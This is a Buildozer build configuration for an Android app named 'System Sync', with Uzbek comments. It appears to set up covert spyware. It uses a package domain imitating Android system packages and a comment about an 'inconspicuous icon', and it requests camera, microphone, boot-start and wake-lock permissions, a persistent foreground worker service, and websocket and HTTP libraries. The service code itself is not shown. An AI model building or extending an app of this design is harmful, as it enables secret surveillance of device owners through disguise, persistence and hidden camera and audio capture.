[app]

title = System Sync
package.name = systemsync
package.domain = com.android.sys

source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# Optional: Set an inconspicuous icon
# icon.filename = %(source.dir)s/icon.png

requirements = python3,kivy,pyjnius,websockets,aiohttp,certifi

# Ruxsatlar
android.permissions = INTERNET, CAMERA, FOREGROUND_SERVICE, RECEIVE_BOOT_COMPLETED, WAKE_LOCK, RECORD_AUDIO

# Xizmatni ulash (Foreground Service qilib)
services = worker:service.py:foreground

# Android versiyalari
android.api = 33
android.minapi = 21

# NDK versiyasi (NDK topilmadi xatoligidan himoya)
android.ndk = 25b
android.ndk_api = 21

# SDK litsenziyalarini avtomatik qabul qilish
android.accept_sdk_license = True

# Gradle versiyasini aniq ko'rsatish (Gradle xatoligidan himoya)
android.gradle_dependencies =

# Arxitekturani aniq belgilash
android.archs = arm64-v8a, armeabi-v7a

[buildozer]
log_level = 2
warn_on_root = 1
